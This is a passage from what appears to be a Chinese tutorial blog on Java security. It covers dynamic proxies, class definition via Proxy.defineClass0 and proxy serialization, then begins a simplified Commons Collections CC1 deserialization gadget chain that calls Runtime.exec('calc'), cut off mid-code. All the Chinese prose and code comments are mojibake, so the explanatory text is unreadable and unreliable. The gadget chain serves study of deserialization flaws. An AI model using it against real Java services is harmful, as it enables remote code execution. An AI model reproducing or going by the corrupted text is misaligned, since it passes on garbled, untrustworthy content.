<h6 id="java-lang-reflect-InvocationHandler"><a href="#java-lang-reflect-InvocationHandler" class="headerlink" title="java.lang.reflect.InvocationHandler"></a>java.lang.reflect.InvocationHandler</h6><p>ç”¨äºè°ƒç”¨<code>java.lang.reflect.Proxy</code>ç”Ÿæˆçš„ä»£ç†ç±»æ–¹æ³•ï¼Œæ¥å£ä¸­åªå®šä¹‰äº†ä¸€ä¸ªæ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> java.lang.reflect;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * æ¯ä¸ªä»£ç†å®ä¾‹éƒ½å…·æœ‰ä¸€ä¸ªå…³è”çš„è°ƒç”¨å¤„ç†ç¨‹åºã€‚å¯¹ä»£ç†å®ä¾‹è°ƒç”¨æ–¹æ³•æ—¶ï¼Œå°†å¯¹æ–¹æ³•è°ƒç”¨è¿›è¡Œç¼–ç å¹¶</span><br><span class="hljs-comment"> * å°†å…¶æŒ‡æ´¾åˆ°å®ƒçš„è°ƒç”¨å¤„ç†ç¨‹åºçš„ invoke æ–¹æ³•ã€‚</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">InvocationHandler</span> </span>&#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * åœ¨ä»£ç†å®ä¾‹ä¸Šå¤„ç†æ–¹æ³•è°ƒç”¨å¹¶è¿”å›ç»“æœã€‚åœ¨ä¸æ–¹æ³•å…³è”çš„ä»£ç†å®ä¾‹ä¸Šè°ƒç”¨æ–¹æ³•æ—¶ï¼Œå°†åœ¨è°ƒç”¨å¤„ç†ç¨‹åºä¸Šè°ƒç”¨æ­¤æ–¹æ³•ã€‚</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> proxy  åœ¨å…¶ä¸Šè°ƒç”¨æ–¹æ³•çš„ä»£ç†å®ä¾‹</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> method å¯¹åº”äºåœ¨ä»£ç†å®ä¾‹ä¸Šè°ƒç”¨çš„æ¥å£æ–¹æ³•çš„ Method å®ä¾‹ã€‚Method å¯¹è±¡çš„å£°æ˜ç±»å°†æ˜¯åœ¨å…¶ä¸­å£°æ˜</span><br><span class="hljs-comment">     *               æ–¹æ³•çš„æ¥å£ï¼Œè¯¥æ¥å£å¯ä»¥æ˜¯ä»£ç†ç±»èµ–ä»¥ç»§æ‰¿æ–¹æ³•çš„ä»£ç†æ¥å£çš„è¶…æ¥å£ã€‚</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> args   åŒ…å«ä¼ å…¥ä»£ç†å®ä¾‹ä¸Šæ–¹æ³•è°ƒç”¨çš„å‚æ•°å€¼çš„å¯¹è±¡æ•°ç»„ï¼Œå¦‚æœæ¥å£æ–¹æ³•ä¸ä½¿ç”¨å‚æ•°ï¼Œ</span><br><span class="hljs-comment">     *               åˆ™ä¸º nullã€‚åŸºæœ¬ç±»å‹çš„å‚æ•°è¢«åŒ…è£…åœ¨é€‚å½“åŸºæœ¬åŒ…è£…å™¨ç±»ï¼ˆå¦‚ java.lang.Integer</span><br><span class="hljs-comment">     *               æˆ– java.lang.Booleanï¼‰çš„å®ä¾‹ä¸­ã€‚</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> ä»ä»£ç†å®ä¾‹çš„æ–¹æ³•è°ƒç”¨è¿”å›çš„å€¼ã€‚å¦‚æœæ¥å£æ–¹æ³•çš„å£°æ˜è¿”å›ç±»å‹æ˜¯åŸºæœ¬ç±»å‹ï¼Œ</span><br><span class="hljs-comment">     * åˆ™æ­¤æ–¹æ³•è¿”å›çš„å€¼ä¸€å®šæ˜¯ç›¸åº”åŸºæœ¬åŒ…è£…å¯¹è±¡ç±»çš„å®ä¾‹ï¼›å¦åˆ™ï¼Œå®ƒä¸€å®šæ˜¯å¯åˆ†é…åˆ°å£°æ˜è¿”å›ç±»å‹çš„ç±»å‹ã€‚</span><br><span class="hljs-comment">     * å¦‚æœæ­¤æ–¹æ³•è¿”å›çš„å€¼ä¸º null å¹¶ä¸”æ¥å£æ–¹æ³•çš„è¿”å›ç±»å‹æ˜¯åŸºæœ¬ç±»å‹ï¼Œåˆ™ä»£ç†å®ä¾‹ä¸Šçš„æ–¹æ³•è°ƒç”¨å°†æŠ›å‡º</span><br><span class="hljs-comment">     * NullPointerExceptionã€‚å¦åˆ™ï¼Œå¦‚æœæ­¤æ–¹æ³•è¿”å›çš„å€¼ä¸ä¸Šè¿°æ¥å£æ–¹æ³•çš„å£°æ˜è¿”å›ç±»å‹ä¸å…¼å®¹ï¼Œ</span><br><span class="hljs-comment">     * åˆ™ä»£ç†å®ä¾‹ä¸Šçš„æ–¹æ³•è°ƒç”¨å°†æŠ›å‡º ClassCastExceptionã€‚</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Throwable ä»ä»£ç†å®ä¾‹ä¸Šçš„æ–¹æ³•è°ƒç”¨æŠ›å‡ºçš„å¼‚å¸¸ã€‚è¯¥å¼‚å¸¸çš„ç±»å‹å¿…é¡»å¯ä»¥åˆ†é…åˆ°åœ¨æ¥å£æ–¹æ³•çš„</span><br><span class="hljs-comment">     *                   throws å­å¥ä¸­å£°æ˜çš„ä»»ä¸€å¼‚å¸¸ç±»å‹æˆ–æœªç»æ£€æŸ¥çš„å¼‚å¸¸ç±»å‹ java.lang.RuntimeException æˆ–</span><br><span class="hljs-comment">     *                   java.lang.Errorã€‚å¦‚æœæ­¤æ–¹æ³•æŠ›å‡ºç»è¿‡æ£€æŸ¥çš„å¼‚å¸¸ï¼Œè¯¥å¼‚å¸¸ä¸å¯åˆ†é…åˆ°åœ¨æ¥å£æ–¹æ³•çš„ throws å­å¥ä¸­</span><br><span class="hljs-comment">     *                   å£°æ˜çš„ä»»ä¸€å¼‚å¸¸ç±»å‹ï¼Œä»£ç†å®ä¾‹çš„æ–¹æ³•è°ƒç”¨å°†æŠ›å‡ºåŒ…å«æ­¤æ–¹æ³•æ›¾æŠ›å‡ºçš„å¼‚å¸¸çš„</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<h5 id="ä½¿ç”¨-java-lang-reflect-Proxy-åŠ¨æ€åˆ›å»ºç±»å¯¹è±¡"><a href="#ä½¿ç”¨-java-lang-reflect-Proxy-åŠ¨æ€åˆ›å»ºç±»å¯¹è±¡" class="headerlink" title="ä½¿ç”¨ java.lang.reflect.Proxy åŠ¨æ€åˆ›å»ºç±»å¯¹è±¡"></a>ä½¿ç”¨ java.lang.reflect.Proxy åŠ¨æ€åˆ›å»ºç±»å¯¹è±¡</h5><p><code>ClassLoader</code>å’Œ<code>Unsafe</code>éƒ½æœ‰ä¸€ä¸ªå«åš<code>defineClassXXX</code>çš„<code>native</code>æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨è¿™ä¸ª<code>native</code>æ–¹æ³•åŠ¨æ€çš„å‘<code>JVM</code>åˆ›å»ºä¸€ä¸ªç±»å¯¹è±¡ï¼Œè€Œ<code>java.lang.reflect.Proxy</code>ç±»æ°å¥½ä¹Ÿæœ‰è¿™ä¹ˆä¸€ä¸ª<code>native</code>æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå°†å¯ä»¥é€šè¿‡è°ƒç”¨<code>java.lang.reflect.Proxy</code>ç±»<code>defineClass0</code>æ–¹æ³•å®ç°åŠ¨æ€åˆ›å»ºç±»å¯¹è±¡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProxyDefineclass</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            ClassPool cp = ClassPool.getDefault();<br>            cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>            CtClass ctClass = cp.makeClass(<span class="hljs-string">&quot;Cat&quot;</span>);<br>            String cmd = <span class="hljs-string">&quot;java.lang.System.out.println(\&quot;hello\&quot;);&quot;</span>;<br>            ctClass.makeClassInitializer().insertBefore(cmd);<br>            ctClass.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>            <span class="hljs-keyword">byte</span>[] classbyte = ctClass.toBytecode();<br>            System.out.println();<br>            ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();<br>            Method defineClass0 = Proxy.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass0&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;ClassLoader.class, String.class, <span class="hljs-keyword">byte</span>[].class, <span class="hljs-keyword">int</span>.class, <span class="hljs-keyword">int</span>.class&#125;);<br>            defineClass0.setAccessible(<span class="hljs-keyword">true</span>);<br>            Class invokedefineclass0 = (Class) defineClass0.invoke(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[]&#123;systemClassLoader, <span class="hljs-string">&quot;Cat&quot;</span>, classbyte, <span class="hljs-number">0</span>, classbyte.length&#125;);<br>            System.out.println(invokedefineclass0);<br>        &#125; <span class="hljs-keyword">catch</span> (CannotCompileException | NoSuchMethodException | IllegalAccessException | InvocationTargetException |<br>                 NotFoundException | IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>åŠ¨æ€ä»£ç†ç”Ÿæˆå‡ºæ¥çš„ç±»æœ‰å¦‚ä¸‹æŠ€æœ¯ç»†èŠ‚å’Œç‰¹æ€§ï¼š</strong></p>
<ol>
<li>åŠ¨æ€ä»£ç†çš„å¿…é¡»æ˜¯æ¥å£ç±»ï¼Œé€šè¿‡<code>åŠ¨æ€ç”Ÿæˆä¸€ä¸ªæ¥å£å®ç°ç±»</code>æ¥ä»£ç†æ¥å£çš„æ–¹æ³•è°ƒç”¨(<code>åå°„æœºåˆ¶</code>)ã€‚</li>
<li>åŠ¨æ€ä»£ç†ç±»ä¼šç”±<code>java.lang.reflect.Proxy.ProxyClassFactory</code>åˆ›å»ºã€‚</li>
<li><code>ProxyClassFactory</code>ä¼šè°ƒç”¨<code>sun.misc.ProxyGenerator</code>ç±»ç”Ÿæˆè¯¥ç±»çš„å­—èŠ‚ç ï¼Œå¹¶è°ƒç”¨<code>java.lang.reflect.Proxy.defineClass0()</code>æ–¹æ³•å°†è¯¥ç±»æ³¨å†Œåˆ°<code>JVM</code>ã€‚</li>
<li>è¯¥ç±»ç»§æ‰¿äº<code>java.lang.reflect.Proxy</code>å¹¶å®ç°äº†éœ€è¦è¢«ä»£ç†çš„æ¥å£ç±»ï¼Œå› ä¸º<code>java.lang.reflect.Proxy</code>ç±»å®ç°äº†<code>java.io.Serializable</code>æ¥å£ï¼Œæ‰€ä»¥è¢«ä»£ç†çš„ç±»æ”¯æŒ<code>åºåˆ—åŒ–/ååºåˆ—åŒ–</code>ã€‚</li>
<li>è¯¥ç±»å®ç°äº†ä»£ç†æ¥å£ç±»(ç¤ºä¾‹ä¸­çš„æ¥å£ç±»æ˜¯<code>com.anbai.sec.proxy.FileSystem</code>)ï¼Œä¼šé€šè¿‡<code>ProxyGenerator</code>åŠ¨æ€ç”Ÿæˆæ¥å£ç±»(<code>FileSystem</code>)çš„æ‰€æœ‰æ–¹æ³•ï¼Œ</li>
<li>è¯¥ç±»å› ä¸ºå®ç°äº†ä»£ç†çš„æ¥å£ç±»ï¼Œæ‰€ä»¥å½“å‰ç±»æ˜¯ä»£ç†çš„æ¥å£ç±»çš„å®ä¾‹(<code>proxyInstance instanceof FileSystem</code>ä¸º<code>true</code>)ï¼Œä½†ä¸æ˜¯ä»£ç†æ¥å£ç±»çš„å®ç°ç±»çš„å®ä¾‹(<code>proxyInstance instanceof UnixFileSystem</code>ä¸º<code>false</code>)ã€‚</li>
<li>è¯¥ç±»æ–¹æ³•ä¸­åŒ…å«äº†è¢«ä»£ç†çš„æ¥å£ç±»çš„æ‰€æœ‰æ–¹æ³•ï¼Œé€šè¿‡è°ƒç”¨åŠ¨æ€ä»£ç†å¤„ç†ç±»(<code>InvocationHandler</code>)çš„<code>invoke</code>æ–¹æ³•è·å–æ–¹æ³•æ‰§è¡Œç»“æœã€‚</li>
<li>è¯¥ç±»ä»£ç†çš„æ–¹å¼é‡å†™äº†<code>java.lang.Object</code>ç±»çš„<code>toString</code>ã€<code>hashCode</code>ã€<code>equals</code>æ–¹æ³•ã€‚</li>
<li>å¦‚æœåŠ¨è¿‡åŠ¨æ€ä»£ç†ç”Ÿæˆäº†å¤šä¸ªåŠ¨æ€ä»£ç†ç±»ï¼Œæ–°ç”Ÿæˆçš„ç±»åä¸­çš„<code>0</code>ä¼šè‡ªå¢ï¼Œå¦‚<code>com.sun.proxy.$Proxy0/$Proxy1/$Proxy2</code>ã€‚</li>
</ol>
<h5 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClassMapDemo</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        InvocationHandlerDemo invocationHandlerDemo = <span class="hljs-keyword">new</span> InvocationHandlerDemo(<span class="hljs-keyword">new</span> HashMap());<br>        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;, invocationHandlerDemo);<br>        System.out.println(proxyMap.put(<span class="hljs-string">&quot;proxy&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>));<br>        proxyMap.get(<span class="hljs-string">&quot;proxy&quot;</span>);<br>        proxyMap.entrySet();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InvocationHandlerDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">InvocationHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> Object map;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">InvocationHandlerDemo</span><span class="hljs-params">(Map map)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.map = map;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>        <span class="hljs-keyword">if</span> (method.getName().contains(<span class="hljs-string">&quot;put&quot;</span>)) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Hook Map.put Method: &quot;</span> + method.getName());<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;not allowed&quot;</span>;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;detect the method: &quot;</span> + method.getName() + <span class="hljs-string">&quot;, and exec without being hooked&quot;</span>);<br>        <span class="hljs-keyword">return</span> method.invoke(<span class="hljs-keyword">this</span>.map, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h5 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">ObjectInterface</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> Object <span class="hljs-title">getClassName</span><span class="hljs-params">(Object object)</span></span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ORIObjectfindName</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ObjectInterface</span></span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getClassName</span><span class="hljs-params">(Object object)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;white class: &quot;</span>+ object.hashCode() +<span class="hljs-string">&quot;, pass!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ObjectfindName</span> <span class="hljs-keyword">implements</span>  <span class="hljs-title">InvocationHandler</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> Object object;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">get</span><span class="hljs-params">(Object object)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.object=object;<br>        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(<span class="hljs-keyword">this</span>.getClass().getClassLoader(), <span class="hljs-keyword">this</span>.object.getClass().getInterfaces(),<span class="hljs-keyword">this</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>        <span class="hljs-keyword">for</span>(Object o:args)&#123;<br>            System.out.println(<span class="hljs-string">&quot;black class proxy: &quot;</span>+ o.hashCode() +<span class="hljs-string">&quot;, block!&quot;</span>);<br>            <span class="hljs-keyword">if</span> (o.toString().contains(<span class="hljs-string">&quot;System&quot;</span>))&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> method.invoke(<span class="hljs-keyword">this</span>.object,args);<br>    &#125;<br><br><br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DynamicProxy</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        ORIObjectfindName oriObjectfindName = <span class="hljs-keyword">new</span> ORIObjectfindName();<br>        oriObjectfindName.getClassName(String.class);<br><br>        ObjectInterface oriObjectfindName1 = <span class="hljs-keyword">new</span> ORIObjectfindName();<br>        ObjectfindName objectfindNameproxy = <span class="hljs-keyword">new</span> ObjectfindName();<br>        ObjectInterface objectInterface =(ObjectInterface) objectfindNameproxy.get(oriObjectfindName1);<br>        objectInterface.getClassName(System.class);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h5 id="åŠ¨æ€ä»£ç†ç±»å®ä¾‹åºåˆ—åŒ–é—®é¢˜"><a href="#åŠ¨æ€ä»£ç†ç±»å®ä¾‹åºåˆ—åŒ–é—®é¢˜" class="headerlink" title="åŠ¨æ€ä»£ç†ç±»å®ä¾‹åºåˆ—åŒ–é—®é¢˜"></a>åŠ¨æ€ä»£ç†ç±»å®ä¾‹åºåˆ—åŒ–é—®é¢˜</h5><p>åŠ¨æ€ä»£ç†ç±»ç¬¦åˆ<code>Java</code>å¯¹è±¡åºåˆ—åŒ–æ¡ä»¶ï¼Œå¹¶ä¸”åœ¨<code>åºåˆ—åŒ–/ååºåˆ—åŒ–</code>æ—¶ä¼šè¢«<code>ObjectInputStream/ObjectOutputStream</code>ç‰¹æ®Šå¤„ç†</p>
<p>åŠ¨æ€ä»£ç†ç”Ÿæˆçš„ç±»åœ¨<code>ååºåˆ—åŒ–/ååºåˆ—åŒ–</code>æ—¶ä¸ä¼šåºåˆ—åŒ–è¯¥ç±»çš„æˆå‘˜å˜é‡ï¼Œå¹¶ä¸”<code>serialVersionUID</code>ä¸º<code>0L</code> ï¼Œä¹Ÿå°†æ˜¯è¯´å°†è¯¥ç±»çš„<code>Class</code>å¯¹è±¡ä¼ é€’ç»™<code>java.io.ObjectStreamClass</code>çš„é™æ€<code>lookup</code>æ–¹æ³•æ—¶ï¼Œè¿”å›çš„<code>ObjectStreamClass</code>å®ä¾‹å°†å…·æœ‰ä»¥ä¸‹ç‰¹æ€§ï¼š</p>
<ol>
<li>è°ƒç”¨å…¶<code>getSerialVersionUID</code>æ–¹æ³•å°†è¿”å›<code>0L</code></li>
<li>è°ƒç”¨å…¶<code>getFields</code>æ–¹æ³•å°†è¿”å›é•¿åº¦ä¸ºé›¶çš„æ•°ç»„</li>
<li>è°ƒç”¨å…¶<code>getField</code>æ–¹æ³•å°†è¿”å›<code>null</code></li>
</ol>
<p>ä½†å…¶çˆ¶ç±»(<code>java.lang.reflect.Proxy</code>)åœ¨åºåˆ—åŒ–æ—¶ä¸å—å½±å“ï¼Œçˆ¶ç±»ä¸­çš„<code>h</code>å˜é‡(<code>InvocationHandler</code>)å°†ä¼šè¢«åºåˆ—åŒ–ï¼Œè¿™ä¸ª<code>h</code>å­˜å‚¨äº†åŠ¨æ€ä»£ç†ç±»çš„å¤„ç†ç±»å®ä¾‹ä»¥åŠåŠ¨æ€ä»£ç†çš„æ¥å£ç±»çš„å®ç°ç±»çš„å®ä¾‹</p>
<p>åŠ¨æ€ä»£ç†ç”Ÿæˆçš„å¯¹è±¡(<code>com.sun.proxy.$ProxyXXX</code>)åºåˆ—åŒ–çš„æ—¶å€™ä¼šä½¿ç”¨ä¸€ä¸ªç‰¹æ®Šçš„åè®®ï¼š<code>TC_PROXYCLASSDESC(0x7D)</code>ï¼Œè¿™ä¸ªå¸¸é‡åœ¨<code>java.io.ObjectStreamConstants</code>ä¸­å®šä¹‰çš„ã€‚åœ¨ååºåˆ—åŒ–æ—¶ä¹Ÿä¸ä¼šè°ƒç”¨<code>java.io.ObjectInputStream</code>ç±»çš„<code>resolveClass</code>æ–¹æ³•è€Œæ˜¯è°ƒç”¨<code>resolveProxyClass</code>æ–¹æ³•æ¥è½¬æ¢æˆç±»å¯¹è±¡çš„</p>
<h3 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h3><h4 id="p-ç‰›ç®€åŒ–-poc"><a href="#p-ç‰›ç®€åŒ–-poc" class="headerlink" title="p ç‰›ç®€åŒ– poc"></a>p ç‰›ç®€åŒ– poc</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1EzbyP</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>          <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.getRuntime()),<br>          <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> 